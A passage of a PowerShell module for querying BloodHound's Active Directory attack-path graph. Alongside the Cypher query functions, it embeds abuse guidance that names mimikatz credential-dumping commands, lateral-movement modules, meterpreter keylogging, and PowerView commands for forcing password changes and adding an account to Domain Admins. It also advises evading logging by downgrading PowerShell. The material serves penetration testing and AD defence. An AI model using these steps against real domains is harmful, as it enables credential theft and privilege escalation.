            Derivative{$E=':MemberOf|:AdminTo|:HasSession*1..'}
            Default   {$E=':MemberOf|:AdminTo|:HasSession*1..'}
            }
        # Domain
        if($DynDom.Value){$D=" {domain: '$($DynDom.Value)'}"}
        }
    Process{
        $N=$DynName.Value
        Switch($Type){
            Logon      {$M="p=shortestPath((C:Computer$D)-[r:HasSession*1]->(U:User {name: '$N'}))" ;$R="DISTINCT(C) ORDER BY C.name"}
            Session    {$M="p=shortestPath((C:Computer {name: '$N'})-[r:HasSession*1]->(U:User$D))" ;$R="DISTINCT(U) ORDER BY U.name"}
            AdminTo    {$M="p=((U:User$D)-[r$E]->(C:Computer {name: '$N'}))"                        ;$R="DISTINCT(U) ORDER BY U.name"}
            AdminBy    {$M="p=((U:User {name: '$N'})-[r$E]->(C:Computer$D))"                        ;$R="DISTINCT(C) ORDER BY C.name"}
            Member     {$M="p=shortestPath(((U:User$D)-[r:MemberOf*1..]->(G:Group {name: '$N'})))"  ;$R="DISTINCT(U) ORDER BY U.name"}
            Membership {$M="p=shortestPath(((U:User {name: '$N'})-[r:MemberOf*1..]->(G:Group$D)))"  ;$R="DISTINCT(G) ORDER BY G.name"}
            }
        if($DynCypher.IsSet){clipThis "MATCH $M RETURN p"}
        else{Cypher "MATCH $M RETURN $R"}
        }
    End{}
    }
#End

################################################# HighValue
Function Get-BloodHoundNodeHighValue{
<#
.Synopsis
   BloodHound Node - Get HighValue
.DESCRIPTION
   Get Bloodhound HighValueNode
.EXAMPLE
   HighValue User
#>
    [Alias('Get-NodeHighValue','HighValue')]
    Param(
        [ValidateSet('User','Computer','Group')]
        [Parameter(Mandatory=0,Position=0)][String]$Type="User"
        )
    DynamicParam{
        # DynDico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynParam
        $DynDom = DynP -Name 'Domain' -Type 'String' -Mandat 0 -Pos 1 -VSet @($Script:CypherDog.DomainList)
        $Dico.Add('Domain',$DynDom)
        # Return Dico
        Return $Dico
        }
    Begin{
        $Type = $type.ToString().Replace($Type[0],$Type[0].ToString().toUpper())
        If($Domain){$Dom=" {domain: '$Domain'}"}
        }
    Process{
        $Query = "MATCH (X:$type$Dom) WHERE X.highvalue=True RETURN X"
        Cypher $Query
        }
    End{}
    }
#End

##################################################### Owned
Function Get-BloodHoundNodeOwned{
<#
.Synopsis
   BloodHound Node - Get Owned
.DESCRIPTION
   Get BloodHound Owned Nodes per type
.EXAMPLE
   Owned Computer
#>
    [Alias('Get-NodeOwned','Owned')]
    Param(
        [ValidateSet('User','Computer','Group')]
        [Parameter(Mandatory=0,Position=0)][String]$Type='Computer'
        )
    DynamicParam{
        # DynDico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynParam
        $DynDom = DynP -Name 'Domain' -Type 'String' -Mandat 0 -Pos 1 -VSet @($Script:CypherDog.DomainList)
        $Dico.Add('Domain',$DynDom)
        # Return Dico
        Return $Dico
        }
    Begin{
        $Type = $type.ToString().Replace($Type[0],$Type[0].ToString().toUpper())
        If($Domain.IsSet){$Dom=" {domain: '$($Domain.Value)'}"}
        }
    Process{
        $Query = "MATCH (X:$type$Dom) WHERE X.owned=True RETURN X"
        Cypher $Query
        }
    End{}
    }
#End

###################################################### Note
function Get-BloodHoundNodeNote{
<#
.Synopsis
   BloodHound Node - Get Note
.DESCRIPTION
   Get BloodHound Node Notes
.EXAMPLE
   note user ALBINA_BRASHEAR@DOMAIN.LOCAL
#>
    [CmdletBinding()]
    [Alias('NodeNote','Note')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValuefromPipeline=0)][NodeType]$Type,
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynNameList = @($Script:CypherDog."${Type}List")
        # Prep DynP
        $DynName = DynP -Name 'Name' -Type 'String[]' -Mandat 1 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $DynNameList
        # DynP to Dico
        $Dico.Add("Name",$DynName)
        # Return Dico
        Return $Dico
        }
    Begin{<#NoOp#>}
    Process{
        Foreach($N in $DynName.Value){
            $Query = "MATCH (n:$Type {name: '$N'}) RETURN n.notes"
            if(-Not$Cypher){Cypher $Query -Expand Data}
            }}
    End{if($Cypher){ClipThis $Query}}
    }
#End

################################################ NoteUpdate
function Set-BloodHoundNodeNote{
<#
.Synopsis
   BloodHound Node - Set Notes
.DESCRIPTION
   Set BloodHound Node Notes
.EXAMPLE
   NoteUpdate user ALBINA_BRASHEAR@DOMAIN.LOCAL 'HelloWorld'
#>
    [CmdletBinding(DefaultParameterSetname='Set')]
    [Alias('Set-NodeNote','NoteUpdate')]
    Param(
        # Node Type [Mandatory]
        [Parameter(Mandatory=1,Position=0)][NodeType]$Type,
        # Overwrite
        [Parameter(ParameterSetname='Set',Mandatory=0)][Switch]$Overwrite,
        # Stamp
        [Parameter(ParameterSetname='Set',Mandatory=0)][Switch]$Stamp,
        # Cypher
        [Parameter(ParameterSetname='Clear',Mandatory=1)][Switch]$Clear,
        # Cypher
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    DynamicParam{
        # Prep Dico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynP
        $DynName = DynP -Name 'Name' -Type 'String[]' -Mandat 1 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $Script:CypherDog."${Type}List"
        $Dico.Add('Name',$DynName)
        # If Set Text
        if($PSCmdlet.ParameterSetName -eq 'Set'){
            $DynText = DynP -Name 'Text' -Type 'String' -Mandat 1 -Pos 2 -Pipe 0 -PipeProp 0
            $Dico.Add('Text',$DynText)
            }
        # Return Dico
        Return $Dico
        }
    Begin{
        # Query0
        $Query0 = "MATCH (X:$Type) WHERE X.name = {NAME} Return X.notes"
        }
    Process{
        Foreach($N in $DynName.Value){
            # If Clear
            if($PSCmdlet.ParameterSetName -eq 'Clear'){
            $Query = "MATCH (X:$Type) WHERE X.name = '$N' SET X.notes=''"
            }
            # If Set
            else{
                $Param = @{NAME="$N"}
                # If Stamp
                if($Stamp){$New = "=== $(Get-date) - $enV:USERNAME ===`r`n$($DynText.Value)"}
                else{$New=$DynText.Value}
                # Get Old Text
                if(-Not$Overwrite){
                    $Old = Cypher $Query0 $Param -Expand data
                    if($Old){$New = ("$Old",$New)-join"`r`n"}
                    }
                # Prep Query1
                $Query = "MATCH (X:$Type) WHERE X.name = {NAME} SET X.notes='$New'"
                }
            if($Cypher){ClipThis $Query $Param}
            # Else
            Else{Cypher $Query $Param}
            }}
    End{<#NoOp#>}
    }
#End

################################################# Blacklist
function Get-BloodHoundBlacklist{
<#
.Synopsis
   BloodHound Node - Get Blacklist
.DESCRIPTION
   Get BloodHound Node Blacklist
.EXAMPLE
   Blacklist User  
#>
    [Alias('Get-Blacklist','Blacklist')]
    Param(
        [Parameter(Mandatory=1,Position=0)][Nodetype]$Type
        )
    Cypher "MATCH (x:$type) WHERE x:Blacklist RETURN x ORDER BY x.name"
    }
#End

########################################### BlacklistUpdate
function Set-BloodHoundBlacklist{
<#
.Synopsis
   BloodHound Node - Set Blacklist
.DESCRIPTION
   Set BloodHound Blacklist Node
.EXAMPLE
   BlacklistUpdate User Bob  
#>
    [Alias('Set-Blacklist','BlacklistAdd')]
    Param(
        [Parameter(Mandatory=1,Position=0)][Nodetype]$Type
        )
    DynamicParam{
        # DynDico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynParam
        $DynName   = DynP -Name 'Name'   -Type 'String[]' -Mandat 0 -Pos 1 -Pipe 1 -PipeProp 1 -VSet @($Script:CypherDog."${type}List")
        $DynCypher = DynP -Name 'Cypher' -Type 'Switch'   -Mandat 0 -Pos 2 -Pipe 0 -PipeProp 0 -VSet $Null
        $Dico.Add('Name',$DynName)
        $Dico.Add('Cypher',$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{}
    Process{foreach($N in $DynName.Value){
                $Q="MATCH (x:$Type) WHERE x.name='$N' SET x:Blacklist"
                if(-Not$DynCypher.IsSet){Cypher $Q}
                }}
    End{if($DynCypher.IsSet){ClipThis $Q}}
    }
#End

########################################### BlacklistDelete
function Remove-BloodHoundBlacklist{
<#
.Synopsis
   BloodHound Node - Remove Blacklist
.DESCRIPTION
   Remove Node from blacklist
.EXAMPLE
   BlacklistDelete User Bob
#>
    [Alias('Remove-Blacklist','BlacklistDelete')]
    Param(
        [Parameter(Mandatory=1,Position=0)][Nodetype]$Type
        )
    DynamicParam{
        # DynDico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynParam
        [Array]$VSet=(Get-BloodHoundBlacklist $type).name
        $VSet += "*" 
        $DynName   = DynP -Name 'Name'   -Type 'String[]' -Mandat 0 -Pos 1 -Pipe 1 -PipeProp 1 -VSet @($Vset)
        $DynCypher = DynP -Name 'Cypher' -Type 'Switch'   -Mandat 0 -Pos 2 -Pipe 0 -PipeProp 0 -VSet $Null
        $Dico.Add('Name',$DynName)
        $Dico.Add('Cypher',$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{}
    Process{
        foreach($N in ($DynName.Value)){
            if($DynName.Value -eq "*"){$Q="MATCH (x:$Type) WHERE x:Blacklist REMOVE x:Blacklist"}
            else{$Q="MATCH (x:$Type) WHERE x.name='$N' REMOVE x:Blacklist"}
            if(-Not$DynCypher.IsSet){Cypher $Q}
            }}
    End{if($DynCypher.IsSet){ClipThis $Q}}
    }
#End

#endregion ################################################


###########################################################
#region ############################################## EDGE

# Get-BloodHoundEdge
# Get-BloodHoundEdgeReverse
# Get-BloodHoundEdgecrossDomain
# Get-BloodHoundEdgeCount
# Get-BloodHoundEdgeInfo
# New-BloodHoundEdge
# Remove-BloodHoundEdge


###################################################### Edge
function Get-BloodHoundEdge{
<#
.Synopsis
   BloodHound Edge - Get Target
.DESCRIPTION
   Specify Source Name / Return Target
.EXAMPLE
   Edge user ALBINA_BRASHEAR@DOMAIN.LOCAL MemberOf Group
#>
    [CmdletBinding()]
    [Alias('Get-Edge','Edge','WhereTo')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValuefromPipeline=0)][NodeType]$SourceType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynNameList = @($Script:CypherDog."${SourceType}List")
        # Prep DynP
        $DynName   = DynP -Name 'Name'       -Type 'String[]' -Mandat 1 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $DynNameList
        $DynEdge   = DynP -Name 'EdgeType'   -Type 'EdgeType' -Mandat 1 -Pos 2 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynTarget = DynP -Name 'TargetType' -Type 'NodeType' -Mandat 1 -Pos 3 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynMax    = DynP -Name 'Degree'     -Type 'String'   -Mandat 0 -Pos 4 -Pipe 0 -PipeProp 0 -VSet @('1','2','3','4','5','6','7','8','9','*')
        $DynCypher = DynP -Name 'Cypher'     -Type 'Switch'   -Mandat 0 -Pos 5 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"      ,$DynName)
        $Dico.Add("EdgeType"  ,$DynEdge)
        $Dico.Add("TargetType",$DynTarget)
        $Dico.Add("Degree"    ,$DynMax)
        $Dico.Add("Cypher"    ,$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{
        $TargetType = $DynTarget.Value
        $EdgeType   = $DynEdge.Value 
        # Max Max
        If($DynMax.Value){
            If($DynMax.Value -eq '*'){$Max='..'}
            else{$Max=".."+(([int]$DynMax.Value))}
            }
        Else{$Max=$Null} 
        $max   
        # If Max and not MemberOf
        If($DynMax.Value -AND $EdgeType -ne 'MemberOf'){
            # Query
            if($Max -ne $null){
                #$Query = "MATCH (A:$TargetType), (B:$SourceType {name: {NAME}}), p=shortestPath((B)-[r:MemberOf*1$max]->(X:Group)-[r2:$EdgeType*1]->(A)) RETURN DISTINCT(A) ORDER BY A.name"
                $Query = "MATCH (A:$TargetType), (B:$SourceType {name: {NAME}}), p=shortestPath((B)-[r:MemberOf|:$EdgeType*1$Max]->(A)) RETURN DISTINCT(A) ORDER BY A.name"
                }
            else{$Query = "MATCH (A:$TargetType), (B:$SourceType {name: {NAME}}), p=shortestPath((B)-[r:$EdgeType*1$Max]->(A)) RETURN DISTINCT(A) ORDER BY A.name"}
            }
        Else{# Query
            $Query = "MATCH (A:$TargetType), (B:$SourceType {name: {NAME}}), p=(B)-[r:$EdgeType*1$Max]->(A) RETURN DISTINCT(A) ORDER BY A.name"
            }}
    Process{
        Foreach($SourceName in $DynName.Value){
            $Param = @{NAME="$SourceName"}
            if(-Not$DynCypher.IsSet){Cypher $Query $Param}
            }}
    End{if($DynCypher.IsSet){ClipThis ($Query-replace"RETURN.+$",'RETURN p') $Param}}
    }
#End

##################################################### EdgeR
function Get-BloodHoundEdgeReverse{
<#
.Synopsis
   BloodHound Edge - Get Source
.DESCRIPTION
   Specify Target Name / Return Source
.EXAMPLE
   EdgeR User MemberOf Group ADMINISTRATORS@SUB.DOMAIN.LOCAL
#>
    [CmdletBinding()]
    [Alias('Get-EdgeR','EdgeR','What')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValuefromPipeline=0)][NodeType]$SourceType,
        [Parameter(Mandatory=1,Position=1,ValuefromPipeline=0)][EdgeType]$EdgeType,
        [Parameter(Mandatory=1,Position=2,ValuefromPipeline=0)][NodeType]$TargetType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynNameList = @($Script:CypherDog."${TargetType}List")
        # Prep DynP
        $DynName   = DynP -Name 'Name'   -Type 'String[]' -Mandat 1 -Pos 3 -Pipe 1 -PipeProp 1 -VSet $DynNameList
        $DynMax    = DynP -Name 'Degree' -Type 'String'   -Mandat 0 -Pos 4 -Pipe 0 -PipeProp 0 -VSet @('1','2','3','4','5','6','7','8','9','*')
        $DynCypher = DynP -Name 'Cypher' -Type 'Switch'   -Mandat 0 -Pos 5 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"   ,$DynName)
        $Dico.Add("Degree" ,$DynMax)
        $Dico.Add("Cypher" ,$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{
        # if Max
        If($DynMax.IsSet){
            if($DynMax.Value -eq '*'){$Max='..'}
            else{$Max=".."+(([int]$DynMax.Value))}
            }
        Else{$Max=$Null}
        # EdgeString
        If($EdgeType -ne 'MemberOf' -AND $DynMax.Value){
            $Query  = "MATCH (A:$SourceType), (B:$TargetType {name: {NAME}}), p=shortestPath((A)-[r:${EdgeType}|:MemberOf*1$Max]->(B)) RETURN DISTINCT(A) ORDER BY A.name"
            }
        Else{$Query = "MATCH (A:$SourceType), (B:$TargetType {name: {NAME}}), p=(A)-[r:${EdgeType}*1$Max]->(B) RETURN DISTINCT(A) ORDER BY A.name"}
        }
    Process{Foreach($Name in $DynName.Value){
            $Param = @{NAME="$Name"}
            if(-Not$DynCypher.IsSet){Cypher $Query $Param}
            }}
    End{if($DynCypher.IsSet){ClipThis ($Query-replace"RETURN.+$",'RETURN p') $Param}}
    }
#End

############################################### CrossDomain
function Get-BloodHoundEdgeCrossDomain{
<#
.Synopsis
   BloodHound Edge - Get CrossDomain
.DESCRIPTION
   Get BloodHound Cross Domain Member|Session Relationships
.EXAMPLE
   Get-BloodHoundCrossDomain Session
.EXAMPLE
   CrossDomain Member
#>
    [CmdletBinding()]
    [Alias('CrossDomain')]
    Param(
        [Validateset('Session','Member')]
        [Parameter(Mandatory=1)][String]$Type,
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    # Prep vars
    Switch($Type){
        Member  {$Source='User'    ;$target='Group';$Edge='MemberOf'}
        Session {$Source='Computer';$target='User' ;$Edge='HasSession'}
        }
    $PathQ = "MATCH p=((S:$Source)-[r:$Edge*1]->(T:$Target)) 
WHERE NOT S.domain = T.domain"
    if($Cypher){$Clip =  "$PathQ`r`nRETURN p"; Set-Clipboard $Clip; Return $Clip}
    #Call
    Cypher "$PathQ
WITH p,
S.name AS Sname,
S.domain AS Sdomain,
T.name AS Tname,
T.domain AS Tdomain
RETURN {
From:   Sdomain,
To:     Tdomain,
Source: Sname,
Target: Tname
} as Obj" -Expand Data |
    Select -expand Syncroot | 
    Add-Member -MemberType NoteProperty -Name Edge -Value $Edge -PassThru | 
    Select From,to,Source,Edge,Target | Sort From,To,Target
    }
#End

################################################# EdgeCount
function Get-BloodHoundEdgeCount{
<#
.Synopsis
   BloodHound Edge - Get Count
.DESCRIPTION
   Get Top Nodes By Edge Count
.EXAMPLE
   EdgeCount Membership
#>
    [CmdletBinding()]
    [Alias('EdgeCount','TopNode')]
    Param(
        [ValidateSet('AdminTo','AdminBy','Session','Logon','Member','Membership')]
        [Parameter(Mandatory=1,Position=0)][String]$type,
        [Parameter(Mandatory=0)][Int]$Limit=5,
        [Parameter(Mandatory=0)][Switch]$Cypher 
        )
    DynamicParam{
        # DynDico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        $Pos=1
        # Prep DynParam
        if($type -match "AdminTo|AdminBy"){
            $DynSub=DynP -Name 'SubType' -Type 'String' -Mandat 0 -Pos $Pos -VSet @('Direct','Delegated','Derivative')
            $Dico.add('SubType',$DynSub)
            $Pos=2
            }
        $DynDom = DynP -Name 'Domain' -Type 'String' -Pos $Pos -Mandat 0 -VSet @($Script:CypherDog.DomainList)
        $Dico.Add('Domain',$DynDom)
        # Return Dico
        Return $Dico
        }
    Process{
        Switch ($DynSub.Value){
            Direct    {$E=':AdminTo*1'}
            Delegated {$E=':MemberOf*1..]->(g:Group)-[r2:AdminTo'}
            Derivative{$E=':MemberOf|:AdminTo|:HasSession*1..'}
            Default   {$E=':MemberOf|:AdminTo|:HasSession*1..'}
            }        
        if($DynDom.Value){$Dom=" {domain: '$($DynDom.Value)'}"}
        if($Limit -eq '0'){$Lim = $Null}Else{$Lim = "LIMIT $Limit"}
        # AdminBy
        if($type -eq 'AdminTo'){
            $Q1 = "MATCH p=((U:User)-[r$E]->(C:Computer$Dom))"
            $Q2 = "$Q1
WITH
C.name as c,
COUNT(DISTINCT(U)) as t
RETURN {Name: c, Count: t} as SingleColumn
ORDER BY t DESC
$Lim"
            }
        # AdminTo
        if($type -eq 'AdminBy'){
            $Q1 = "MATCH p=((S:User$Dom)-[r$E]->(T:Computer))"
            $Q2 = "$Q1
WITH
S.name as s,
COUNT(DISTINCT(T)) as t
RETURN {Name: s, Count: t} as SingleColumn
ORDER BY t DESC
$Lim"
            }
        # Session
        if($Type -eq 'Logon'){
        $Q1 = "MATCH p=shortestPath((U:User$Dom)<-[r:HasSession*1..]-(C:Computer))"
        $Q2 = "$Q1
WITH
U.name as n,
COUNT(DISTINCT(C)) as c 
RETURN {Name: n, Count: c} as SingleColumn
ORDER BY c DESC
$Lim"
            }
        # Logon
        if($Type -eq 'Session'){
            $Q1 = "MATCH p=shortestPath((A:User)<-[r:HasSession*1]-(B:Computer$Dom))" 
            $Q2 = "$Q1
WITH B.name as n,
COUNT(DISTINCT(A)) as c   
RETURN {Name: n, Count: c} as SingleColumn
ORDER BY c DESC
$Lim"
            }
        # Group
        if($Type -eq 'Membership'){
            $Q1 = "MATCH p=shortestPath((A:User$Dom)-[r:MemberOf*1..]->(B:Group))" 
            $Q2 = "$Q1
WITH A.name as n,
COUNT(DISTINCT(B)) as c   
RETURN {Name: n, Count: c} as SingleColumn
ORDER BY c DESC
$Lim"
            }
        # Group
        if($Type -eq 'Member'){
            $Q1 = "MATCH p=shortestPath((A:User)-[r:MemberOf*1..]->(B:Group$Dom))" 
            $Q2 = "$Q1
WITH B.name as n,
COUNT(DISTINCT(A)) as c   
RETURN {Name: n, Count: c} as SingleColumn
ORDER BY c DESC
$Lim"
            }
        # Output
        If($cypher){$Q = "$Q1 RETURN p";Set-clipBoard $Q;Return $Q}
        Else{
            Cypher $Q2 -Expand Data| Select -Expand SyncRoot
            }}}
#########End

################################################## EdgeInfo
function Get-BloodHoundEdgeInfo{
<#
.Synopsis
   BloodHound Edge - Get Info
.DESCRIPTION
   Get BloodHound Edge Info [online]
.EXAMPLE
   EdgeInfo MemberOf
.EXAMPLE
   EdgeInfo MemberOf -Online 
#>
    [Alias('Get-EdgeInfo','EdgeInfo')]
    Param(
        [Parameter(Mandatory=1)][Edgetype]$Type,
        [Parameter(Mandatory=0)][Switch]$Online
        )
    Switch($Type){
#################################################################################        
MemberOf{
$Info='Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.'
#
$Abuse='No abuse is necessary. This edge simply indicates that a principal belongs to a security group.'
#
$Opsec='No opsec considerations apply to this edge.'
#
$Ref=@(
'https://adsecurity.org/?tag=ad-delegation'
'https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions'
)
}
#################################################################################       
AdminTo{
$Info='By default, administrators have several ways to perform remote code execution on Windows systems,including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution.
Further, administrators have several options for impersonating other users logged onto the system,including plaintext password extraction, token impersonation, and injecting into processes running as another user.
Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques'
#
$Abuse="There are several ways to pivot to a Windows system. 
If using Cobalt Strike's beacon, check the help info for the commands 'psexec', 'psexec_psh', 'wmi', and 'winrm'.
With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. 
With Metasploit, consider the modules 'exploit/windows/smb/psexec', 'exploit/windows/winrm/winrm_script_exec', and 'exploit/windows/local/ps_wmi_exec'.
Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine's service control manager, and remotely instantiating DCOM objects.
For more information about these lateral movement techniques, see the References tab."
#
$Opsec='There are several forensic artifacts generated by the techniques described above. 
For instance, lateral movement via PsExec will generate 4697 events on the target system.
If the target organization is collecting and analyzing those events, they may very easily detect lateral movement via PsExec. 
Additionally, an EDR product may detect your attempt to inject into lsass and alert a SOC analyst.
There are many more opsec considerations to keep in mind when abusing administrator privileges.
For more information, see the References tab.'
#
$Ref=@(
'https://attack.mitre.org/wiki/Lateral_Movement'
'http://blog.gentilkiwi.com/mimikatz'
'https://github.com/gentilkiwi/mimikatz'
'https://adsecurity.org/?page_id=1821'
'https://attack.mitre.org/wiki/Credential_Access'
'https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf'
'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1'
'https://attack.mitre.org/wiki/Technique/T1134'
'https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/'
'https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/'
'https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/'
)
}
#################################################################################       
HasSession{
#
$Info="When users authenticate to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.
Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.
Note: A session does not guarantee credential material is present, only possible."
#
$Abuse="# Password Theft
When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer.
Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system.
You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's 'keyscan_start' command to start keylogging a user, then 'keyscan_dump' to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.

# Token Impersonation
You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab.
User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started."
#
$Opsec="An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."
#
$Ref=@("http://blog.gentilkiwi.com/mimikatz"
"https://github.com/gentilkiwi/mimikatz"
"https://adsecurity.org/?page_id=1821"
"https://attack.mitre.org/wiki/Credential_Access"
"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf"
"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"
"https://attack.mitre.org/wiki/Technique/T1134")
}
#################################################################################
TrustedBy{Return}
#################################################################################     
ForceChangePassword{
#
$Info="The capability to change the user password without knowing that user's current password."
#
$Abuse="There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). 
See the opsec considerations tab for why this may be a bad idea. 
The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. 
This function is superior to using the net.exe binary in several ways. 
For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. 
Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).
To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as a member of DC_3.DOMAIN.LOCAL if you are not running a process as a member. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then create a secure string object for the password you want to set on the target user:

`$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Finally, use Set-DomainUserPassword, optionally specifying `$Cred if you are not already running a process as DC_3.DOMAIN.LOCAL:

Set-DomainUserPassword -Identity andy -AccountPassword `$UserPassword -Credential `$Cred

Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab"
#
$Opsec="Executing this abuse with the net binary will necessarily require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts. 
Regardless of what execution procedure you use, this action will generate a 4724 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for users that are obviously very high privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. You may be able to completely evade those features by downgrading to PowerShell v2.
Finally, by changing a service account password, you may cause that service to stop functioning properly. This can be bad not only from an opsec perspective, but also a client management perspective. Be careful!"
#
$Ref=@("https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
"https://www.sixdub.net/?p=579"
"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724")
}
#################################################################################
AddMember{
#
$Info='The User X has the ability to add arbitrary principals, including itself, to the Group Y. Because of security group delegation, the members of a security group have the same privileges as that group. 

By adding itself to the group, User X will gain the same privileges that Group Y already has.'
#
$Abuse="There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group 'Domain Admins' dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as AZALEE_CASALE@DOMAIN.LOCAL if you are not running a process as that user if you are not running a process as that user. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Add-DomainGroupMember, optionally specifying `$Cred if you are not already running a process as User X:

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential `$Cred

Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

Get-DomainGroupMember -Identity 'Domain Admins'"
#
$Opsec='Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts. 
Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. 
You may be able to completely evade those features by downgrading to PowerShell v2.'
#
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"
)
}
